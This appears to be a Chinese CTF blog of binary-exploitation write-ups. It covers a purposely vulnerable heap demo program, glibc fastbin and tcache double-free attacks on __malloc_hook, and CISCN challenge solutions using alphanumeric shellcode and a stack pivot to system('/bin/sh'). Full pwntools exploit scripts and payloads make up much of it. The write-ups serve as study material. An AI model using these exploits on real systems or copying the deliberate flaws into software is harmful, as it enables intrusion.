大部分的时间都花在重复性的刷题来掌握牢固低版本glibc的漏洞 换句话说这段时间一点进步也没有233 今天突然想起来许久没有更了 那就直接步入正题 演示程序源码我自己写的 想复现的可以自行编译 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123; puts(&quot;Life is fucking movie&quot;); puts(&quot;Life is always full of unhappiness, like this question&quot;); puts(&quot;Anyway, what&#x27;s your answer&quot;); puts(&quot;&gt;&quot;);&#125;void add()&#123; int index; char size[20]; puts(&quot;What do you really want?&quot;); if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123; if(!chunk_ptr[chunk_time])&#123; printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time); puts(&quot;You can customize the size of chunk, but what about your life&quot;); read(0,size,0x8); chunk_size[chunk_time] = atoi(size); chunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]); puts(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;); read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]); chunk_time++; &#125;else&#123; puts(&quot;error&quot;); exit(0); &#125; &#125;else&#123; exit(0); puts(&quot;&quot;); &#125;&#125;void delete()&#123; char data[100]; int index; puts(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;); scanf(&quot;%d&quot;,&amp;index); free(chunk_ptr[index]);&#125;void edit()&#123; int index; puts(&quot;It&#x27;s never too late to start again. What do you regret?&quot;); scanf(&quot;%d&quot;,&amp;index); puts(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;); read(0,chunk_size[index],0x8); puts(&quot;Come back!&quot;); read(0,chunk_ptr[index],chunk_size[index]);&#125;void show()&#123; puts(&quot;You can&#x27;t live a perfect life without making any effort&quot;); int index; scanf(&quot;%d&quot;,&amp;index); puts(chunk_ptr[index]);&#125;int main()&#123; int choice; init(); puts(&quot;This program is used to debug heap vulnerabilities&quot;); puts(&quot;write by chen&quot;); while(1)&#123; menu(); scanf(&quot;%d&quot;,&amp;choice); switch(choice)&#123; case 1: add(); break; case 2: delete(); break; case 3: edit(); break; case 4: show(); break; case 5: puts(&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;); puts(&quot;You will be stronger next time I see you&quot;); exit(0); break; &#125; &#125;&#125; 顺便提供一下exp脚本 方便大家快速开始调试 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import*io = process(&quot;./testheap&quot;)elf = ELF(&quot;./testheap&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]def debug(): gdb.attach(io) pause()def add(size,payload): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;You can customize the size of chunk, but what about your life&quot;) io.sendline(str(size)) io.recvuntil(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;) io.send(payload)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;) io.sendline(str(index))def edit(index,size,payload): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;It&#x27;s never too late to start again. What do you regret?&quot;) io.sendline(str(index)) io.recvuntil(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;) io.sendline(str(size)) io.recvuntil(&quot;Come back!&quot;) io.send(payload)def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;You can&#x27;t live a perfect life without making any effort&quot;) io.sendline(str(index)) ubuntu16.04 libc2.23fastbin的范围是0x20 - 0x80 这里的大小不是用户申请的大小 而是系统实际分配的大小 fastbin设计的初衷是为了方便小内存chunk的释放和重新分配 为了防止和相邻的chunk合并 所以位于fastbin中的free chunk的PREV_INUSE位不会被设置为0 始终为1 存放fastbin链表的是malloc_state结构体 1234567891011121314151617181920212223242526272829303132struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; 在pwndbg中可以使用arena来查看其结构 其中可以看到fastbin一共有十个链表 但是可用的只有7个 其范围从0x20 - 0x80 并且是实际分配的chunk大小 而非用户申请的大小 fastbin为单向链表 遵循着先进后出的原则 即先进来的chunk位于链表尾 在2.23及以下的版本 glibc对于fastbin的检查是依靠于检测main_arena指向的chunk 即位于链表头的chunk 如果要释放的chunk和位于链表头的chunk是同一个 那么就会触发double free终止进程 123456789if (SINGLE_THREAD_P) &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (&quot;double free or corruption (fasttop)&quot;); p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old); *fb = p; &#125; 如果我们直接释放两次chunk1 *** Error in &#96;.&#x2F;testheap’: double free or corruption (fasttop): 0x000055df88768010 *** 程序就被终止了 但是如果我们利用chunk2来干扰一下链表结构 如果此时我们释放chunk1后释放chunk2 此时再次释放chunk1 在第二次释放chunk1之前的链表头为chunk2 系统此时误判没有double free 那么释放chunk1后的链表结构就如图所示 在pwndbg中的表现如此 可以看到此时chunk1即位于链表头又位于链表尾 如果我们再次申请一个0x30大小的chunk 申请到的是位于链表头的chunk1 但是此时还有一个chunk1在链表中 我们此时获得了修改chunk1的fd域的能力 如果修改chunk1的fd域 此时的链表结构就会为 此时我们再次申请三个chunk 申请的第三个chunk就会分配到’testtest’处的地址 chunk以该地址为chunk的prev_size首地址 而非用户区的首地址 1234567891011add(0x20,b&#x27;aaaa&#x27;)#0add(0x20,b&#x27;aaaa&#x27;)#1add(0x10,b&#x27;aaaa&#x27;)#2delete(0)delete(1)delete(0)add(0x20,p64(0x666666))#3add(0x20,b&#x27;aaaa&#x27;)#4add(0x20,b&#x27;aaaa&#x27;)#5add(0x20,b&#x27;testtest&#x27;)debug() 但是你很快就会发现 我们并不能如愿以偿申请到0x666666地址的chunk 这是因为fastbin在分配出chunk的时候对于chunk的size域还有一次检查 检查你要申请的这个chunk的大小是否在该fastbin链的大小尺寸范围内 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (__glibc_unlikely (misaligned_chunk (victim))) malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 2&quot;); if (SINGLE_THREAD_P) *fb = REVEAL_PTR (victim-&gt;fd); else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we&#x27;re here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (__glibc_unlikely (misaligned_chunk (tc_victim))) malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 3&quot;); if (SINGLE_THREAD_P) *fb = REVEAL_PTR (tc_victim-&gt;fd); else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; 你可能也在其他教程或者wp中见到 我们在libc2.23的情况下 通常都是打malloc_hook 这是因为在malloc_hook-0x23处可以绕过fastbin的检测 我们来看一下 1234567891011121314151617181920add(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x80,b&#x27;aaaa&#x27;)#2add(0x10,b&#x27;aaaa&#x27;)#3delete(2)show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7fbf49537b78-0x7fbf49173000)success(&quot;libc_addr :&quot;+hex(libc_addr))malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]success(&quot;malloc_hook :&quot;+hex(malloc_hook))onegadget_addr = libc_addr + 0x4527adelete(0)delete(1)delete(0)add(0x68,p64(malloc_hook-0x23))add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;aaaa&#x27;)debug() 此时malloc_hook-0x23正位于fastbin的链表上 我们跟进一下这个地址查看其内容 可以看到此时这个地址的第二个字长处正好是0x7f 由于free chunk位于的是0x70的链表 所以可以通过检查将其取出 随后我们只需要覆盖0xb+0x8的垃圾数据就能篡改malloc_hook 并且在ubuntu16中 这个地址处恒为0x7f ubuntu18.04 libc2.27（old）版本来到ubuntu18 此时新设了一个bin 名为tcachebin 这里只需要知道0x20-0x408的chunk都会优先被释放到其单向链表上 其他的我们在tcachebinattack中讲 此时fastbin的漏洞依然存在 我们仍然可以通过穿插释放一个chunk来使glibc误判 但是由于fastbin的范围被tcache覆盖 我们需要将tcache的一个链表填满 才能释放到fastbin中 不过由于tcachebin的漏洞更好利用 实际上在ubuntu18中 大部分都是使用的tcachebinattack 这里做个了解就行了 12345678910111213add(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7): add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7): delete(i+3)delete(0)delete(1)delete(0)","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"ciscn历年国赛复现","slug":"ciscn历年国赛复现","date":"2023-02-22T12:33:07.000Z","updated":"2023-02-23T02:40:26.022Z","comments":true,"path":"2023/02/22/ciscn历年国赛复现/","link":"","permalink":"http://example.com/2023/02/22/ciscn%E5%8E%86%E5%B9%B4%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"备战一下今年的国赛 准备复现以往的题目来熟悉一下难度 [CISCN 2022 初赛]login_normal12345678[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: &#x27;/home/chen/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/&#x27; 保护全开 一开始还以为是道堆题 ida进去看看 123456789101112131415void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char s[1032]; // [rsp+0h] [rbp-410h] BYREF unsigned __int64 v4; // [rsp+408h] [rbp-8h] v4 = __readfsqword(0x28u); buffer(); while ( 1 ) &#123; memset(s, 0, 0x400uLL); printf(&quot;&gt;&gt;&gt; &quot;); read(0, s, 0x3FFuLL); sub_FFD(s); &#125;&#125; main函数接收了s 并且作为sub_ffd的参数 跟进一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109unsigned __int64 __fastcall sub_FFD(_BYTE *a1)&#123; char *sa; // [rsp+8h] [rbp-48h] char *sb; // [rsp+8h] [rbp-48h] char *sc; // [rsp+8h] [rbp-48h] char *sd; // [rsp+8h] [rbp-48h] char v7; // [rsp+17h] [rbp-39h] int v8; // [rsp+1Ch] [rbp-34h] int v9; // [rsp+2Ch] [rbp-24h] void *dest; // [rsp+30h] [rbp-20h] char *s1; // [rsp+38h] [rbp-18h] char *nptr; // [rsp+40h] [rbp-10h] unsigned __int64 v13; // [rsp+48h] [rbp-8h] v13 = __readfsqword(0x28u); memset(bss_array, 0, sizeof(bss_array)); v8 = 0; v7 = 0; dest = 0LL; while ( !*a1 || *a1 != &#x27;\\n&#x27; &amp;&amp; (*a1 != &#x27;\\r&#x27; || a1[1] != 10) ) &#123; if ( v8 &lt;= 5 ) bss_array[2 * v8] = a1; sb = strchr(a1, &#x27;:&#x27;); if ( !sb ) &#123; puts(&quot;error.&quot;); exit(1); &#125; *sb = 0; for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc ) *sc = 0; if ( !*sc ) &#123; puts(&quot;abort.&quot;); exit(2); &#125; if ( v8 &lt;= 5 ) bss_array[2 * v8 + 1] = sc; sd = strchr(sc, &#x27;\\n&#x27;); if ( !sd ) &#123; puts(&quot;error.&quot;); exit(3); &#125; *sd = 0; a1 = sd + 1; if ( *a1 == &#x27;\\r&#x27; ) *a1++ = 0; s1 = bss_array[2 * v8]; nptr = bss_array[2 * v8 + 1]; if ( !strcasecmp(s1, &quot;opt&quot;) ) &#123; if ( v7 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; v7 = atoi(nptr); &#125; else &#123; if ( strcasecmp(s1, &quot;msg&quot;) ) &#123; puts(&quot;error.&quot;); exit(4); &#125; if ( strlen(nptr) &lt;= 1 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; v9 = strlen(nptr) - 1; if ( dest ) &#123; puts(&quot;error.&quot;); exit(5); &#125; dest = calloc(v9 + 8, 1uLL); if ( v9 &lt;= 0 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; memcpy(dest, nptr, v9); &#125; ++v8; &#125; *a1 = 0; sa = a1 + 1; if ( *sa == &#x27;\\n&#x27; ) *sa = 0; switch ( v7 ) &#123; case 2: sub_DA8(dest); break; case 3: sub_EFE(dest); break; case 1: sub_CBD(dest); break; default: puts(&quot;error.&quot;); exit(6); &#125; return __readfsqword(0x28u) ^ v13;&#125; 很长的一串代码 我们需要先代码审计看一下这串代码目的是什么 12345v13 = __readfsqword(0x28u);memset(bss_array, 0, sizeof(bss_array));v8 = 0;v7 = 0;dest = 0LL; 对于几个变量进行了初始化 1while ( !*a1 || *a1 != &#x27;\\n&#x27; &amp;&amp; (*a1 != &#x27;\\r&#x27; || a1[1] != 10) ) 当a1为\\x00 \\n \\r 时跳出while循环 接着我们来分析一下while中的内容 123456789if ( v8 &lt;= 5 ) bss_array[2 * v8] = a1; sb = strchr(a1, &#x27;:&#x27;); if ( !sb ) &#123; puts(&quot;error.&quot;); exit(1); &#125; *sb = 0; 首先是第一个判断 v8在while的末尾进行了一个自增运算 是用来限制执行次数的 那么这个while循环最多只能循环六次 接着在bss段上的一个全局数组存入a1 即我们在main函数中输入的s字符串 利用strchr函数查找了a1中’:’的位置 如果没有查找到的话就进入if循环 exit退出 同时将对应的’:’清零 1234567for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc ) *sc = 0; if ( !*sc ) &#123; puts(&quot;abort.&quot;); exit(2); &#125; 第二次判断 先进行了一个for循环 sc指向’:’的下一个字节处 for循环的执行顺序为 先赋值再判断 最后进入循环内 而循环的内容是清零对应地址指向的内容 看到下面的if判断 显然不是我们想要的结果 所以想办法绕过for循环 那就使得’:’后的一个字节为’ ‘、’\\r’、’\\n’、’\\t’ 123456789if ( v8 &lt;= 5 ) bss_array[2 * v8 + 1] = sc; sd = strchr(sc, &#x27;\\n&#x27;); if ( !sd ) &#123; puts(&quot;error.&quot;); exit(3); &#125;*sd = 0; 第三个判断 要求字符串中有\\n 所以上面的判断我们填入的应该是\\n 12345a1 = sd + 1; if ( *a1 == &#x27;\\r&#x27; ) *a1++ = 0; s1 = bss_array[2 * v8]; nptr = bss_array[2 * v8 + 1]; a1为’\\n’后的下一个字节处 如果a1为\\r 那么其下一个字长处为0 此时将s1和nptr赋值为bss_array 我们回溯一下上面 可以发现在最开始和第三次判断之前进行了赋值 12bss_array[2 * v8] = a1;bss_array[2 * v8 + 1] = sc; 最开始的a1并没有任何的修改 所以此时的s1应该为最开始我们输入的s字符串中’:’前面的字符串 而sc为’:’后面的字符串 不过由于在第三次判断时 使sd的值为0 sd为sc字符串中’\\n’的 所以sc只剩下’:’后除’\\n’字符串了 12345678910111213141516171819202122232425262728293031323334353637if ( !strcasecmp(s1, &quot;opt&quot;) ) &#123; if ( v7 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; v7 = atoi(nptr); &#125; else &#123; if ( strcasecmp(s1, &quot;msg&quot;) ) &#123; puts(&quot;error.&quot;); exit(4); &#125; if ( strlen(nptr) &lt;= 1 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; v9 = strlen(nptr) - 1; if ( dest ) &#123; puts(&quot;error.&quot;); exit(5); &#125; dest = calloc(v9 + 8, 1uLL); if ( v9 &lt;= 0 ) &#123; puts(&quot;error.&quot;); exit(5); &#125; memcpy(dest, nptr, v9); &#125; ++v8; &#125; 接着来看这个if判断式 如果s1等于’opt’就进入if 否则进入else if中将nptr的值赋值给了v7 else中计算了nptr的长度 并且减去1后赋值给了v9 最后申请了一块堆空间 将nptr以v9个字节读入到dest中 12345678910111213141516171819*a1 = 0; sa = a1 + 1; if ( *sa == &#x27;\\n&#x27; ) *sa = 0; switch ( v7 ) &#123; case 2: sub_DA8(dest); break; case 3: sub_EFE(dest); break; case 1: sub_CBD(dest); break; default: puts(&quot;error.&quot;); exit(6); &#125; 最后一个部分 清空了a1的值 sa指向a1字符串的末尾 如果有换行符赋值为0 最后进行一个switch选择分支 参数为v7 根据v7的值进入不同的函数 参数为dest 综上所述 我们需要构造的payload的格式应该为 123 opt:(v7)(x)\\n或者是msg:(dest)(x)\\n其中x是任意单字节的垃圾数据 因为需要使得v9等于dest的长度 接着跟进一下switch分支中的各个函数 12345678910111213141516171819202122232425unsigned __int64 __fastcall sub_CBD(const char *a1)&#123; int i; // [rsp+14h] [rbp-1Ch] unsigned __int64 v3; // [rsp+18h] [rbp-18h] v3 = __readfsqword(0x28u); for ( i = 0; i &lt; strlen(a1); ++i ) &#123; if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 ) &#123; puts(&quot;oh!&quot;); exit(-1); &#125; &#125; if ( !strcmp(a1, &quot;ro0t&quot;) ) &#123; unk_202028 = 1; unk_202024 = 1; &#125; else &#123; unk_202028 = 1; &#125; return __readfsqword(0x28u) ^ v3;&#125; for循环中对dest中的字符串进行了检查 isprintf检查字符是否可以被打印 同时&amp;&amp;关联了一个判断式 当dest中没有换行符时才能通过if判断 接着如果dest字符串的值为ro0t时 unk_202028 &#x3D; unk_202024 &#x3D; 1 否则unk_202028 &#x3D; 1 这里可能会有疑惑 之前的函数不是将dest中的\\n赋值为了0 这个0会对字符串的判断产生影响吗 123456789#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; char a[20]; scanf(&quot;%s&quot;,a); int b; b=strcasecmp(a,&quot;test&quot;); printf(&quot;%d&quot;,b);&#125; 这里尝试了一下 答案是不会 这里还不知道这两个bss段的全局变量值会有什么影响 接着看下一个函数 123456789101112131415161718192021222324252627282930313233343536unsigned __int64 __fastcall sub_DA8(const char *a1)&#123; unsigned int v1; // eax size_t v2; // rax int i; // [rsp+14h] [rbp-2Ch] void *dest; // [rsp+18h] [rbp-28h] unsigned __int64 v6; // [rsp+28h] [rbp-18h] v6 = __readfsqword(0x28u); for ( i = 0; i &lt; strlen(a1); ++i ) &#123; if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 ) &#123; puts(&quot;oh!&quot;); exit(-1); &#125; &#125; if ( unk_202028 != 1 ) &#123; puts(&quot;oh!&quot;); exit(-1); &#125; if ( unk_202024 ) &#123; v1 = getpagesize(); dest = mmap(&amp;loc_FFE + 2, v1, 7, 34, 0, 0LL); v2 = strlen(a1); memcpy(dest, a1, v2); (dest)(); &#125; else &#123; puts(a1); &#125; return __readfsqword(0x28u) ^ v6;&#125; 开头同样是对于dest字符串进行一个检测 接着如果unk_202028不等于1就结束进程 如果unk_202024&#x3D;1就进入if分支否则进入else分支 else分支可以打印出a1 但是感觉不太好利用 还是来看看if分支 getpagesize获取了当前页的基地址 目的是为了配合mmap函数将该页的权限修改为7 即可读可写可执行 接着将a1字符串写入到这块内存空间中 最后执行 那显然是shellcode 并且还得是可见字符串shellcode 否则过不了最开始的判断 剩下一个函数就没什么好看的了 没啥作用 可见字符串shellcode要利用alpha3生成 具体的办法我相关博客有写 这里不复述 要注意的是本题的shellcode执行是call rdx 完整exp: 123456789101112131415161718192021from pwn import*from struct import packio = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26603)#io = remote(&quot;1.14.71.254&quot;,28753)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()shellcode = &#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;payload1=&#x27;opt:1\\n&#x27;+&#x27;msg:ro0ta\\n&#x27;io.sendlineafter(&quot;&gt;&gt;&gt; &quot;,payload1)payload2 = &#x27;opt:2\\n&#x27;+&#x27;msg:&#x27; + shellcode + &#x27;a\\n&#x27;io.sendlineafter(&quot;&gt;&gt;&gt; &quot;,payload2)io.interactive() ciscn_2019_es_2checksec看一下保护机制 ida打开 主函数应该是vul 跟进看一下 12345678910int vul()&#123; char s[40]; // [esp+0h] [ebp-28h] BYREF memset(s, 0, 0x20u); read(0, s, 0x30u); printf(&quot;Hello, %s\\n&quot;, s); read(0, s, 0x30u); return printf(&quot;Hello, %s\\n&quot;, s);&#125; 只能溢出两个字长 只够我们覆盖ebp和ret addr 这种情况下只能考虑栈迁移了 先搞清楚为什么出题人会给两个read吧 栈迁移我们首先需要知道栈帧的地址 而我们知道 一个栈帧在结束的时候 ebp中存储的是父函数的栈底地址 printf函数遇到\\0时就会停止输出 如果我们将s这个数组填满 那么它就会继续输出下一个字长 这样我们就泄露了ebp的内容 1payload = b&quot;a&quot;*0x27+b&quot;b&quot; 此时我们使用gdb进行动调 目的是为了得到ebp和我们输入的s的偏移(哪怕开启了pie或者RELRO 由于分页机制的特性 偏移是不变的) 我们将断点打在vul函数的nop汇编的地址 0xa8-0x70 &#x3D; 0x38 于是我们得到 变量s的起始地址为ebp_addr - 0x38 12payload = (b&quot;aaaa&quot;+p32(system_addr)+p32(0)+p32(ebp_addr-0x38+0x10)+b&quot;/bin/sh&quot;).ljust(0x28,b&quot;\\x00&quot;)payload += p32(ebp_addr-0x38)+p32(leave_ret) 这里解释一下p32(ebp_addr-0x38+0x10) 我们知道 栈迁移需要一个字长的垃圾数据来平衡栈 此时aaaa的地址为ebp_addr-0x38 &#x2F;bin&#x2F;sh前面的三个字长则占用了0xc字节 所以此时&#x2F;bin&#x2F;sh的位置则位于ebp_addr-0x38+0x10 完整exp: 123456789101112131415161718from pwn import*#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,28157)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)io.recvuntil(&quot;Welcome, my friend. What&#x27;s your name?&quot;)payload = b&quot;a&quot;*0x27+b&quot;b&quot;io.send(payload)io.recvuntil(&quot;b&quot;)ebp_addr = u32(io.recv(4))system_addr = 0x8048400binsh_addr = ebp_addr - 0x38+0x10ret_addr = 0x080483a6leave_addr = 0x080484b8 payload = (cyclic(0x4)+p32(system_addr)+p32(0xabcdabcd)+p32(binsh_addr)+b&quot;/bin/sh&quot;).ljust(0x28,b&quot;\\x00&quot;)payload += p32(ebp_addr-0x38)+p32(leave_addr)io.sendline(payload)io.interactive() ciscn-2019-final-3这题没想出来根据堆块地址不断申请到main_arena的chunk 然后泄露基址的思路 记录一下 扩展一下思路 checksec ida反编译 看一下伪代码 12345678910111213141516171819202122232425void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; __int64 v3; // rax int v4; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); sub_C5A(a1, a2, a3); v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;welcome to babyheap&quot;); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); while ( 1 ) &#123; menu(); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;choice &gt; &quot;); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v4); if ( v4 == 1 ) &#123; add(); &#125; else if ( v4 == 2 ) &#123; delete(); &#125; &#125;&#125; 只给了两个函数 add和delete 其中delete没有置零指针 存在UAF漏洞 add函数在申请完chunk后打印了chunk的用户空间区域首地址 那么此时我们拥有的漏洞只有UAF了 只能利用这个来泄露基址和获取shell 获取shell好说 这题的环境是Ubuntu18 可以打hook 并且tcache的检查机制没有fastbin那么复杂 可以很轻松的利用double free修改fd来申请任意内存空间的chunk 那么难点落在泄露libc基址了 题目没有给我们show函数 但是相比其他堆题给了打印申请chunk的地址的机会 很明显要利用这个来替代show函数 那么此时就可以利用UAF来申请到一块位于libc基址附近内存区域的chunk 那么我们可以联想到如果unsortedbin中的单个链表如果只有一个 free chunk 那么其fd和bk域的值就会是main_arena_addr+padding 此时存放main_arena_addr的地址我们也知道 就可以在tcachebin上窜成一个链表 申请到位于main_arena_addr的堆块 那么此时add函数中的这条代码就可以输出该chunk的用户空间首地址 即泄露了main_arena_addr 我们就可以得到libc基址 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,28487)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()def add(index,size,payload): io.recvuntil(&quot;choice &gt; &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;input the index&quot;) io.sendline(str(index)) io.recvuntil(&quot;input the size&quot;) io.sendline(str(size)) io.recvuntil(&quot;now you can write something&quot;) io.send(payload) io.recvuntil(&quot;gift :&quot;)def delete(index): io.recvuntil(&quot;choice &gt; &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;input the index&quot;) io.sendline(str(index))add(0,0x70,b&#x27;aaaa&#x27;)add(1,0x70,b&#x27;aaaa&#x27;)heap_addr = int(io.recv(14),16)success(hex(heap_addr))for i in range(1,9): add(i+1,0x70,b&#x27;aaaa&#x27;)delete(0)delete(0)add(10,0x70,p64(heap_addr-0x10))add(11,0x70,b&#x27;aaaa&#x27;) 此时 我们double free chunk0 此时的链表结构如下图 按照tcachebins单向链表先进后出的原则 此时我们获得是蓝色的那个free chunk 并且tcachebin显示的链表地址是chunk的用户空间首地址 此时我们将申请的chunk的内容设置为chunk1的首地址 就可以将其作为白色的free chunk的fd域 挂载在链表上 从而我们就可以申请到对应的内存空间 而利用for循环申请的几个chunk 则是为了等下修改chunk1的size域 从而合并后面的chunk空间 获得一个大于tcachebin范围的chunk 这样就能释放到unsortedbin中了 12345payload = p64(0)+p64(0x481)add(12,0x70,payload)add(13,0x20,b&#x27;aaaa&#x27;)add(14,0x20,b&#x27;aaaa&#x27;)delete(1) 此时覆盖chunk1的size域 并且释放chunk1 chunk13是用来后面的double free chunk14是用来防止和top chunk合并 此时我们就成功往unsortedbin中释放了一个chunk 那么指向main_arena的地址也就是我们上面的heap_addr 我们用同样的办法 再次利用double free任意申请到一个chunk 123delete(13)delete(13)add(15,0x20,p64(heap_addr)) 但是此时的链表结构显示是不全的 其是根据箭头所指的数据来显示free chunk 使用tel指令可以查看其地址指向 